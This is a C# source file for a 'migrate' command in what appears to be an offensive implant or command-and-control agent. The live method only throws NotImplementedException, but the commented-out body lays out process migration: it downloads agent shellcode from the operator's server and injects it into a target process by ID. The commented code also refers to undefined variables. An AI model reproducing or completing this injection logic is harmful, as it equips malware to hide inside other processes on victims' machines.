using Agent.Internal;
using Agent.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class MigrateCommand : AgentCommand
    {
        public override string Name => "migrate";

        public override void InnerExecute(AgentTask task, AgentCommandContext context)
        {
            throw new NotImplementedException();
            /*if (task.SplittedArgs.Length < 1)
            {
                context.Result.Result = $"Usage: {this.Name} ProcessId";
                return;
            }

            int processId = int.Parse(task.SplittedArgs[0]);

            var process = Process.GetProcessById(processId);
            if (process == null)
            {
                context.Result.Result = $"Unable to fin process with Id {processId}";
                return;
            }


            bool x64 = ListProcessCommand.Is64bitProcess(process);

            context.Result.Result += $"Target Process is {(x64 ? "x64" : "x86")}, downloading appropriate shellcode..." + Environment.NewLine;

            var shellcode =  context.MessageServiceDownloadAgentBin(!x64).Result;

            this.Notify(result, commm, $"Shellcode Downloaded");

            context.Result.Result += $"Injecting {(x64 ? "x64" : "x86")} shellcode..." + Environment.NewLine;
            var injectRes = Injector.Inject(process, shellcode, false);
            if (!injectRes.Succeed)
                context.Result.Result += $"Migration failed : {injectRes.Error}";
            else
            {
                context.Result.Result += $"Migration succeed!" + Environment.NewLine;
                if (!string.IsNullOrEmpty(injectRes.Output))
                    context.Result.Result += injectRes.Output;
            }*/
        }
    }
}
